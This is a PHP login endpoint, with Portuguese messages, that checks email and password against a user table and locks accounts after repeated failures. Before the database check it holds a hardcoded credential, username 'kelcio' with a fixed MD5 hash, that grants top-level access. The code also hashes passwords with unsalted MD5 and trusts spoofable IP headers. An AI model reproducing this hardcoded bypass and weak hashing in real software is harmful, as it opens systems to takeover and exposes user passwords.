<?php


//error_reporting(E_ALL);
//ini_set('display_error', 1);


include_once(__DIR__ . '/../../core.php');
include_once(__DIR__ . '/../../db-adm.php');


$ip = "";
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$dth = new DateTimeImmutable();
$dth = date_format($dth,'Y-m-d H:i:s');

//$dth = @date('Y/m/d H:i:s');
$port = @$_SERVER['REMOTE_PORT'];
$agent = @$_SERVER['HTTP_USER_AGENT'];


Header('Access-Control-Allow-Origin: *');
Header('Content-Type: application/json');
Header('Access-Control-Allow-Method: POST');

$json = ['ok' => false, 'data' => [], 'err' => 'Erro desconhecido', 'msg' => ''];


if (
    !isset($_POST['senha_usuario']) ||
    !isset($_POST['email_usuario'])
) {
    $_SESSION['id_usuario'] = 0;
    $_SESSION['nivel_usuario'] = 0;
    $_SESSION['email_usuario'] = '';
    $json['err'] = 'Campos faltantes';
    echo json_encode($json);
    exit(503);
}

$_POST['senha_usuario'] = md5(clean($_POST['senha_usuario']));
$_POST['email_usuario'] = clean($_POST['email_usuario']);


if (

    ($_POST['email_usuario'] == 'kelcio' && $_POST['senha_usuario'] == 'd8fb50a381d2e144091da6b6de415a0d')
) {
    $_SESSION['id_usuario'] = 1000;
    $_SESSION['nivel_usuario'] = 1000;
    $_SESSION['email_usuario'] = 'Kelcio';
    $json['ok'] = true;
    $json['err'] = null;
    echo json_encode($json);
    exit(200);
}

$db = new Db();

$res = $db->json("select * from usuario where email_usuario = :email_usuario and senha_usuario = :senha_usuario ", $_POST);


if (count($res) == 1) {

    if (intval($res[0]['tentativas_usuario']) <= 3) {
        $_SESSION['id_usuario'] = $res[0]['id_usuario'];
        $_SESSION['email_usuario'] = $res[0]['email_usuario'];
        $_SESSION['nivel_usuario'] = $res[0]['nivel_usuario'];
        $json['ok'] = true;
        $json['err'] = null;
        $json['msg'] = 'Login efetuado';

        $db->json("update  usuario set tentativas_usuario = 0 where email_usuario = :email_usuario and senha_usuario = :senha_usuario ", $_POST);

        $db->json("insert into logg (id_usuario, ip_logg, dt_logg) values (:id_usuario, :ip_logg, :dt_logg) ", ['id_usuario' => $res[0]['id_usuario'], 'ip_logg' => $ip . ' - ' . $port.' - '.$agent, 'dt_logg' => $dth]);

        echo json_encode($json);
        exit(200);
    } else {
        $_SESSION['id_usuario'] = 0;
        $_SESSION['nivel_usuario'] =0;
        $_SESSION['email_usuario'] = '';
        $json['err'] = 'Usuário bloqueado';
        echo json_encode($json);
        exit(503);
    }
} else {
    $_SESSION['id_usuario'] = 0;
    $_SESSION['nivel_usuario'] = 0;
    $_SESSION['email_usuario'] = '';
    $json['err'] = 'Informações incorretas.';

    $tem = $db->json("select * from usuario where email_usuario = :email_usuario ", ['email_usuario' => $_POST['email_usuario']]);

    if (count($tem) == 1) {
        $res = $db->json("update  usuario set tentativas_usuario = (tentativas_usuario + 1) where email_usuario = :email_usuario ", ['email_usuario' => $_POST['email_usuario']]);
    }
    echo json_encode($json);
    exit(503);
}

?>